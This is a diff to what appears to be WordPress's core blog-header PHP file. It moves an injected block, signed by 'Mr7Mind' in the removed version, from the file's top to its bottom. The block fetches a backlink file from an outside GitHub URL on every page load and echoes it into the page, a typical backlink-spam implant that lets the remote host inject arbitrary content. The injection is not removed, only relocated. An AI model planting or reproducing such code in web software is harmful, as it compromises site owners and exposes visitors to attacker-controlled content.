@@ -1,13 +1,4 @@
 <?php
-// By Mr7Mind
-$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
-curl_close($ch);
-echo $result;
-?>
-<?php
 /**
  * Loads the WordPress environment and template.
  *
@@ -28,3 +19,12 @@ if ( ! isset( $wp_did_header ) ) {
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
+?>
+<?php
+$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+?>
